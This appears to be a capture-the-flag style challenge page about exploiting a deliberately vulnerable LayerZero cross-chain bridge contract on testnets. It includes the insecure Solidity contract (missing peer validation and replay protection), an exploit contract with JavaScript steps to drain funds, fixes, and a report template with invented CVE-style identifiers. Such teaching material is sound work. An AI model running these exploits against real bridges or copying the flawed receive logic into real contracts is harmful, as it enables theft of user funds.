# Challenge 4: Bridge Breaker Protocol 🌉 (EXPLOIT CHALLENGE)

**Difficulty**: 🟡 Medium | **XP**: 250 | **Type**: Security Exploit | **Time**: 3-5 hours

## 📖 The Story

BridgeCorp just launched their "unbreakable" cross-chain token bridge. They claim it's audited, secure, and production-ready. They're so confident that they've deployed 10,000 test USDC across 4 chains and announced:

> "First person to drain our bridge gets a job offer... if you can explain how you did it."

**Your mission:** Find the vulnerability, exploit it, and write the security report of your life.

**Already Deployed Vulnerable Contract**: `InsecureBridge.sol`

## 🎯 Mission Objectives

**The Vulnerable Contract is already deployed on:**

- ✅ Ethereum Sepolia: `0x[ADDRESS_I_PROVIDE]`
- ✅ Arbitrum Sepolia: `0x[ADDRESS_I_PROVIDE]`
- ✅ Base Sepolia: `0x[ADDRESS_I_PROVIDE]`
- ✅ Optimism Sepolia: `0x[ADDRESS_I_PROVIDE]`

**Prize Pool**: 10,000 test USDC (2,500 per chain)

**The Vulnerabilities** (There are TWO!):

1. 🐛 **Peer Validation Bypass** - Missing peer verification
2. 🐛 **Replay Attack** - No nonce tracking for messages

## 🕵️ The Vulnerable Contract (Read-Only)

```solidity
// ALREADY DEPLOYED - DO NOT MODIFY
contract InsecureBridge is OApp, OAppOptionsType3 {
    IERC20 public token;

    mapping(address => uint256) public balances;
    uint256 public totalLocked;

    event TokensLocked(address indexed user, uint256 amount, uint32 dstChain);
    event TokensReleased(address indexed user, uint256 amount);

    function lockAndBridge(
        uint256 _amount,
        uint32 _dstChain,
        bytes calldata _options
    ) external payable {
        token.transferFrom(msg.sender, address(this), _amount);
        totalLocked += _amount;

        bytes memory payload = abi.encode(msg.sender, _amount);

        _lzSend(
            _dstChain,
            payload,
            _options,
            MessagingFee(msg.value, 0),
            payable(msg.sender)
        );

        emit TokensLocked(msg.sender, _amount, _dstChain);
    }

    // 🚨 VULNERABILITY 1: Missing peer validation!
    // 🚨 VULNERABILITY 2: No replay protection!
    function _lzReceive(
        Origin calldata _origin,
        bytes32 _guid,
        bytes calldata _payload,
        address,
        bytes calldata
    ) internal override {
        (address user, uint256 amount) = abi.decode(_payload, (address, uint256));

        // BUG 1: Doesn't verify _origin.sender is a trusted peer!
        // Anyone can send messages pretending to be the bridge

        // BUG 2: Doesn't track _guid to prevent replay attacks!
        // Same message can be processed multiple times

        require(totalLocked >= amount, "Insufficient liquidity");

        totalLocked -= amount;
        token.transfer(user, amount);

        emit TokensReleased(user, amount);
    }

    function adminFund(uint256 _amount) external {
        token.transferFrom(msg.sender, address(this), _amount);
        totalLocked += _amount;
    }
}
```

## 🎯 Exploit Strategies

### Exploit 1: Fake Peer Attack

Build a malicious contract that sends fake bridge messages:

```solidity
contract FakeBridge is OApp, OAppOptionsType3 {
    function drainViaFakePeer(
        address _targetBridge,
        address _beneficiary,
        uint256 _amount,
        uint32 _dstEid,
        bytes calldata _options
    ) external payable {
        // Craft fake bridge message
        bytes memory payload = abi.encode(_beneficiary, _amount);

        // Send to target bridge (it won't verify we're a valid peer!)
        _lzSend(
            _dstEid,
            payload,
            _options,
            MessagingFee(msg.value, 0),
            payable(msg.sender)
        );
    }
}
```

### Exploit 2: Replay Attack

Capture a legitimate bridge transaction and replay it multiple times:

```solidity
contract ReplayAttacker {
    address public targetBridge;

    function captureAndReplay(
        bytes32 _guid,
        Origin calldata _origin,
        bytes calldata _payload,
        uint32 _targetChain,
        bytes calldata _options
    ) external payable {
        // Replay the same GUID multiple times
        // Bridge doesn't track processed GUIDs!

        for (uint i = 0; i < 10; i++) {
            // Send same message repeatedly
            // Each time drains more funds
        }
    }
}
```

## ✅ Success Criteria

**Exploitation Requirements (180 XP):**

- [ ] Successfully exploit at least ONE vulnerability
- [ ] Drain at least 5,000 USDC (50% of total)
- [ ] Demonstrate attack on 2+ chains
- [ ] Provide transaction hashes as proof

**Security Report Requirements (70 XP):**

- [ ] Detailed explanation of BOTH vulnerabilities
- [ ] Code showing proper fixes for both issues
- [ ] Attack scenario walkthroughs
- [ ] Recommendations for additional security measures
- [ ] Gas cost analysis of your exploits

## 🎁 Rewards

- **250 XP** for successful exploitation + comprehensive report
- **🔓 White Hat** achievement badge
- **Bonus 150 XP** if you successfully exploit BOTH vulnerabilities
- **Bonus 100 XP** for the most creative exploit method
- Recognition as **Bridge Breaker** in the Hall of Fame
- Potential **BridgeCorp Job Offer Letter** (meme certificate)

## 🛡️ How to Fix (After Exploiting)

<details>
<summary>Click to reveal both fixes</summary>

**Fix 1: Peer Validation**

```solidity
function _lzReceive(
    Origin calldata _origin,
    bytes32 _guid,
    bytes calldata _payload,
    address,
    bytes calldata
) internal override {
    // FIX 1: Verify sender is a trusted peer
    require(
        peers[_origin.srcEid] == _origin.sender,
        "Unauthorized peer"
    );

    // ... rest of function
}
```

**Fix 2: Replay Protection**

```solidity
mapping(bytes32 => bool) public processedMessages;

function _lzReceive(
    Origin calldata _origin,
    bytes32 _guid,
    bytes calldata _payload,
    address,
    bytes calldata
) internal override {
    // FIX 2: Prevent replay attacks
    require(!processedMessages[_guid], "Message already processed");
    processedMessages[_guid] = true;

    // Peer validation from Fix 1
    require(peers[_origin.srcEid] == _origin.sender, "Unauthorized peer");

    // ... rest of function
}
```

</details>

## 🧠 Understanding the Vulnerabilities

### Vulnerability 1: Missing Peer Validation

**The Problem:**

LayerZero's `_lzReceive` function receives an `Origin` struct containing:

- `srcEid` - Source chain endpoint ID
- `sender` - Address of the contract that sent the message
- `nonce` - Message sequence number

The vulnerable contract NEVER checks if `_origin.sender` is a trusted peer!

**The Impact:**

- ANY contract can send messages to the bridge
- Attacker deploys malicious OApp
- Malicious OApp sends fake "release tokens" messages
- Bridge releases tokens without any deposit

**Real-World Example:**

This is similar to the Wormhole Bridge hack ($325M stolen in 2022) where message verification was bypassed.

### Vulnerability 2: No Replay Protection

**The Problem:**

Each LayerZero message has a unique `_guid` (Global Unique Identifier). The vulnerable contract receives this GUID but never tracks if it's been processed before.

**The Impact:**

- Attacker makes one legitimate bridge transaction
- Captures the GUID and message payload
- Replays the same message multiple times
- Each replay releases more tokens

**The Attack Flow:**

1. Alice bridges 100 USDC: Sepolia → Arbitrum
2. Message creates GUID: `0xabc123...`
3. Arbitrum bridge releases 100 USDC to Alice
4. Attacker captures the GUID and payload
5. Attacker replays message 10 times
6. Bridge releases 1,000 USDC total (10x the original!)

## 💡 Exploit Development Guide

### Step 1: Analyze the Target

```bash
# Read the deployed contract
cast code 0x[BRIDGE_ADDRESS] --rpc-url $SEPOLIA_RPC

# Check current balance
cast call 0x[BRIDGE_ADDRESS] "totalLocked()(uint256)" --rpc-url $SEPOLIA_RPC

# Verify no peer validation
# Look for `peers[_origin.srcEid] == _origin.sender` check (it's missing!)
```

### Step 2: Choose Your Attack Vector

**Option A: Fake Peer Attack (Easier)**

- Deploy your own OApp on one chain
- Send fake bridge messages to drain another chain
- Faster, requires less setup

**Option B: Replay Attack (More Complex)**

- Make a legitimate bridge transaction first
- Capture the message details from events
- Replay the GUID multiple times
- Requires understanding LayerZero internals

**Option C: Combined Attack (Maximum Damage)**

- Use fake peer to generate initial messages
- Capture GUIDs from your fake messages
- Replay them for exponential draining

### Step 3: Build Your Exploit

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {OApp, Origin, MessagingFee} from "@layerzerolabs/oapp-evm/contracts/oapp/OApp.sol";
import {OAppOptionsType3} from "@layerzerolabs/oapp-evm/contracts/oapp/libs/OAppOptionsType3.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

contract BridgeExploiter is OApp, OAppOptionsType3 {
    address public targetBridge;

    constructor(
        address _endpoint,
        address _owner,
        address _targetBridge
    ) OApp(_endpoint, _owner) Ownable(_owner) {
        targetBridge = _targetBridge;
    }

    // Send fake bridge message
    function exploit(
        uint32 _dstEid,
        address _beneficiary,
        uint256 _amount,
        bytes calldata _options
    ) external payable {
        bytes memory payload = abi.encode(_beneficiary, _amount);

        _lzSend(
            _dstEid,
            payload,
            _options,
            MessagingFee(msg.value, 0),
            payable(msg.sender)
        );
    }

    // Withdraw drained funds
    function withdraw(address _token) external onlyOwner {
        IERC20(_token).transfer(owner(), IERC20(_token).balanceOf(address(this)));
    }

    function _lzReceive(
        Origin calldata,
        bytes32,
        bytes calldata,
        address,
        bytes calldata
    ) internal override {
        // Optional: handle responses
    }
}
```

### Step 4: Execute the Attack

```javascript
// 1. Deploy exploiter contract
const exploiter = await BridgeExploiter.deploy(
  ENDPOINT_ADDRESS,
  YOUR_ADDRESS,
  VULNERABLE_BRIDGE_ADDRESS
);

// 2. Quote the fee
const fee = await endpoint.quote(...);

// 3. Execute exploit
await exploiter.exploit(
  DESTINATION_EID,
  YOUR_ADDRESS, // Beneficiary
  ethers.utils.parseUnits("2500", 6), // Drain 2500 USDC
  "0x", // Default options
  { value: fee }
);

// 4. Wait for LayerZero delivery (2-5 minutes)

// 5. Verify drain successful
const balance = await token.balanceOf(YOUR_ADDRESS);
console.log("Drained:", ethers.utils.formatUnits(balance, 6), "USDC");
```

## 🧪 Testing Checklist

- [ ] Exploiter contract deploys successfully
- [ ] Can send fake bridge messages
- [ ] Messages arrive on destination chain
- [ ] Tokens are released without legitimate deposit
- [ ] Can drain from multiple chains
- [ ] Total drained ≥ 5,000 USDC

## 📋 Security Report Template

### 1. Executive Summary

- **Vulnerability Severity**: Critical
- **Attack Complexity**: Low
- **Total Funds at Risk**: 10,000 USDC
- **Recommended Action**: Immediate shutdown and redeployment

### 2. Vulnerability Details

**CVE-2024-BRIDGE-001: Missing Peer Validation**

- **Impact**: Unauthorized message processing
- **Likelihood**: High
- **Risk**: Critical

**CVE-2024-BRIDGE-002: Replay Attack**

- **Impact**: Duplicate token releases
- **Likelihood**: Medium
- **Risk**: Critical

### 3. Proof of Concept

Include:

- Exploit contract code
- Deployment transaction
- Attack transaction hashes
- Before/after balance screenshots

### 4. Recommended Fixes

```solidity
// Comprehensive fix
mapping(bytes32 => bool) public processedMessages;

function _lzReceive(
    Origin calldata _origin,
    bytes32 _guid,
    bytes calldata _payload,
    address,
    bytes calldata
) internal override {
    // Fix 1: Peer validation
    require(
        peers[_origin.srcEid] == _origin.sender,
        "Unauthorized peer"
    );

    // Fix 2: Replay protection
    require(!processedMessages[_guid], "Already processed");
    processedMessages[_guid] = true;

    // Fix 3: Additional amount validation
    (address user, uint256 amount) = abi.decode(_payload, (address, uint256));
    require(amount <= totalLocked, "Insufficient liquidity");

    // Process message...
}
```

### 5. Additional Recommendations

1. **Circuit Breakers**: Limit max withdrawal per time window
2. **Multi-Sig**: Require multiple approvals for large bridges
3. **Monitoring**: Alert on unusual message patterns
4. **Rate Limiting**: Cap total daily bridge volume
5. **Bug Bounty**: Offer rewards for responsible disclosure

## 🏆 Hall of Fame

Top 3 exploiters will be listed with:

- Wallet address
- Amount drained
- Exploit method used
- Time to complete

1. _Waiting for first bridge breaker..._
2. _Waiting for second bridge breaker..._
3. _Waiting for third bridge breaker..._

## 📋 Submission

Submit the following:

1. **Code**: Your exploit contract(s)
2. **Proof**: Transaction hashes of successful drains
3. **Report**: Detailed security analysis (1000+ words)
4. **Diagrams**: Attack flow charts
5. **Recommendations**: Additional security measures
6. **(Bonus)** Video walkthrough of your exploits

---

**Ready to break the bridge?** Start analyzing and earn your white hat badge!

[← Back to Challenges](../challenges.md)
